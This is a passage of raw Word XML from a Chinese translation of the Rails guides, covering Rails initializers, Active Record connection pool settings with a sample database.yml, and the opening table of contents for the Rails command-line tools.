        <w:t xml:space="preserve"> 为生成器所用的模板，这用于应用程序，所有的 railtie 和 engine 还有那些添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.gengrators.templates</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置里的模板。这让所有这些模板都可被所有的生成器引用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58211C77"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ensure_autoload_once_paths_as_subset</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 确保 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.autoload_once_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 只包含来自 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.autoload_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的路径。如果它包含其它路径，那么将会抛出一个异常。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="094DEF87"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add_to_prepare_blocks</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 在应用程序，一个railtie 或者 engine 里的所有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.to_prepare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 调用的代码块会被添加到 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>to_prepare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 所有 Action Dispatch 回调中去。这些回调在开发环境中的每个请求发生时都会运行，或者在生产环境中在只有在第一次请求发生时运行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DEACFE9"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add_builtin_route</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果应用程序运行在开发环境下，那么它会将 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>rails/info/properties</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的路由添加到应用程序的路由中去. 一般的Rails应用里,这个路由提供了诸如 Rails 和 Ruby 的版本之类的信息显示于 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>public/index.html</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0436C429"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build_middleware_stack</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 建造应用程序的中间件堆栈, 返回一个又 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>call</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 方法的对象,这个方法带有请求的一个 Rack 环境对象.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44101A4F"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eager_load!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为 true, 运行 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.before_eager_load</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> hook 然后调用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>eager_load!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 它将会加载 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.eager_load_paths</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里的所有 Ruby 文件.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CE1221"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finisher_hook</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 为应用程序初始化过程完成后提供一个 hook, 和为应用程序, 所有的 railtie 和 engine 运行所有的 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.after_initialize</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 代码块一样.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="549A5620"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set_routes_reloader</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 配置 Action Dispatch 通过使用 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActionDispatch::Callbacks.to_prepare</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 重新加载所有的路由文件.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FE6F72C"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b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>disable_dependency_loading</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.cache_classes</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 true 并且 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config.dependency_loading</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 设置为 false, 那么取消自动加载依赖.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA51BE4" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>7 数据库连接池</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2BC98D"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Active Record 数据库连接是由 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>ActiveRecord::ConnectionAdapters::ConnectionPool</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 来管理的, 它会确保多个线程能同时访问有限的数据库连接. 这个限制默认是 5 个,可以在 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 里配置.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="72FB4F2A" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="69E00A40"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development:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="52F625E5"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adapter: sqlite3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4818AA91"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database: db/development.sqlite3</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7554577C"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pool: 5</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FAD35F2" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>  timeout: 5000</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E18FEB0"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因为连接池是默认由 ActiveRecord 内部处理的, 所有的应用程序服务器(Thin, mongrel, Unicorn 等等) 应该表现得一样. 最初, 数据库连接池是空的而且将会创建附加的连接作为它们增长的需求,知道它达到连接池的限制.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FEF664E"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所有的请求在第一次需要访问数据库的时候都会签出一个连接, 随后将会将连接签入回去. 在请求结束的时候,也就意味着该附加连连接槽应该可以给队列中的下一个请求使用.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3472EF" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">注意. 如果你启用了 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Rails.threadsafe!</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 模式, 那么就有机会又数个线程同时访问多个连接. 所有根据你当前的请求量, 有多个线程竞争数量有限的连接也是没问题的.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2A284B" w14:textId="21B75406" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>5.9、</w:t>
      </w:r>
      <w:hyperlink r:id="rId877" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Rails 命令行工具和 Rake 任务</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0558ADA0"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Rails 命令行工具提供了以下功能：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="360987A7" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="229"/>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创建 Rails 应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26A5D1CF" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="229"/>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生成 models ， controllers ， migrations 以及单元测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="426EB842" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="229"/>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启动开发服务器</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C9F8F73" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="229"/>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使用 shell 测试 models 对象</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="004EEF98" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="229"/>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自定义应用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F4A5243" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="0091039A" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0091039A">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>目录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1142CF74" w14:textId="77777777" w:rsidR="0091039A" w:rsidRPr="0091039A" w:rsidRDefault="008938C9" w:rsidP="0091039A">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="230"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId878" w:anchor="1" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>命令行基础</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="4B1D416C"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79" w:anchor="1-1" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails new</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3C63B37C"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80" w:anchor="1-2" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails server</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="57E9816C"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81" w:anchor="1-3" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails generate</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="34170339"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82" w:anchor="1-4" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails console</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="71E36644"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83" w:anchor="1-5" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails dbconsole</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3BD72043"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84" w:anchor="1-6" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>rails runner</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="46FD70FF"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85" w:anchor="1-7" w:history="1">
        <w:r w:rsidR="0091039A" w:rsidRPr="0091039A">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
